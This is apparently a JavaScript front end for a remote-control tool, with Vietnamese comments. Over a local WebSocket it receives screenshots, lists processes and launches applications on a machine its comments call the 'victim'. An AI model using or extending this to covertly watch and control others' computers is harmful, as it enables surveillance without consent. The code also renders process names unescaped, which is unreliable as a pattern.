// C:\server\client\script.js

// LƯU Ý: Đảm bảo cổng này khớp với Terminal Server (8081)
const WEB_SOCKET_URL = `ws://127.0.0.1:8081`; // Máy nạn nhân

const appTableBody = document.querySelector('#app-table tbody'); 
const screenshotViewer = document.getElementById('screenshot-viewer'); 
const systemLogElement = document.getElementById('system-log-output');
const statusElement = document.getElementById('connection-status');

let ws;

function initWebSocket() {
    ws = new WebSocket(WEB_SOCKET_URL); 

    ws.onopen = () => {
        updateCoreStatus('Connected');
        logMessage('Đã kết nối tới Server.', 'status');
    };

    ws.onmessage = (event) => {
    const data = event.data;
    if (typeof data !== 'string') return;

        // 1. XỬ LÝ ẢNH BASE64 (CHÍNH LÀ NÓ Ở ĐÂY!)
        if (data.startsWith("IMG_B64:")) {
            // Cắt bỏ header "IMG_B64:" để lấy phần dữ liệu ảnh thuần túy
            const base64Str = data.substring(8); 
            
            // --- BƯỚC QUAN TRỌNG NHẤT ---
            // Tạo chuỗi Data URI để trình duyệt hiểu đây là ảnh
            const imgSrc = "data:image/bmp;base64," + base64Str;
            
            const timestamp = new Date().toLocaleTimeString().replace(/:/g, "-");

            // --- HIỂN THỊ LÊN HTML ---
            // Bạn đang thay đổi nội dung của div có id="screenshot-viewer"
            // bằng một thẻ <img> chứa dữ liệu ảnh vừa nhận.
            screenshotViewer.innerHTML = `
                <div style="text-align: center;">
                    <h3 style="color: #00C851;">Đã nhận ảnh! (${timestamp})</h3>
                    <img src="${imgSrc}" style="max-width: 100%; border: 2px solid #fff; margin-bottom: 10px;">
                    <br>
                    <a href="${imgSrc}" download="screenshot_${timestamp}.bmp" 
                    style="display:inline-block; background: #00C851; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; font-weight: bold;">
                    <i class="fas fa-download"></i> TẢI ẢNH VỀ MÁY
                    </a>
                </div>
            `;
            logMessage("📸 Đã nhận ảnh Screenshot thành công!", "success");
            return;
        }

        // 2. XỬ LÝ LIST APP
        if (data.startsWith("JSON_LIST:")) {
            try {
                const jsonStr = data.substring(10).trim();
                const parsed = JSON.parse(jsonStr);
                if (parsed.type === 'PROCESS_LIST') {
                    displayApplicationList(parsed.data);
                    logMessage(`✅ Đã tải danh sách: ${parsed.data.length} process.`, 'success');
                }
            } catch (e) {
                logMessage("Lỗi JSON List: " + e.message, "error");
            }
            return;
        }

        // 3. TIN NHẮN HỆ THỐNG
        if (data.startsWith("CMD_MSG:")) {
            logMessage(data.substring(8), 'info');
        } else {
            // Bỏ qua tin nhắn rác hoặc in ra dạng raw
            // logMessage(data, 'raw'); 
        }
    };

    ws.onclose = () => {
        updateCoreStatus('Disconnected');
        setTimeout(initWebSocket, 2000); 
    };
}

function displayApplicationList(apps) {
    appTableBody.innerHTML = ''; 
    if (!apps || apps.length === 0) {
        appTableBody.innerHTML = '<tr><td colspan="2">Không có dữ liệu.</td></tr>';
        return;
    }

    apps.forEach(app => {
        const row = appTableBody.insertRow();
        row.insertCell().textContent = app.pid;
        
        const nameCell = row.insertCell();
        const displayPath = (app.path && app.path !== "?" && app.path !== "undefined") ? app.path : "N/A";
        nameCell.innerHTML = `<b>${app.name}</b><br><span style="color:#aaa;font-size:0.8em">${displayPath}</span>`;
    });
}

function sendCommand(cmd) {
    if (ws && ws.readyState === WebSocket.OPEN) ws.send(cmd);
}

function updateCoreStatus(st) {
    if(statusElement) {
        statusElement.textContent = st;
        statusElement.style.color = st === 'Connected' ? '#0f0' : '#f00';
    }
}

function logMessage(msg, type) {
    const div = document.createElement('div');
    div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    div.style.color = type === 'success' ? '#0f0' : (type === 'error' ? '#f00' : '#ccc');
    if(systemLogElement) {
        systemLogElement.appendChild(div);
        systemLogElement.scrollTop = systemLogElement.scrollHeight;
    }
}

window.startApp = function() {
    const input = document.getElementById('app-name-input');
    if(input && input.value) sendCommand(`application start ${input.value}`);
}

window.onload = initWebSocket;